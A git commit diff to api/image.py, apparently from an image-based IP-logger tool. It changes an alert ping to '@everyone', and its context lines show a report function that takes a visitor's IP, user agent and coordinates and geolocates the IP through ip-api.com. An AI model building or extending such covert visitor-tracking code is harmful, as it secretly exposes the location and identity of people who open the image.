43fd732df6be74d581a73f9c831d4002dc7e4401
zswett10 <zswett@outlook.com>
2025-03-03 08:39:11 -0600

    Update image.py

--- api/image.py
+++ api/image.py
@@ -107,7 +107,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@rizzle"
+    ping = "@everyone"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
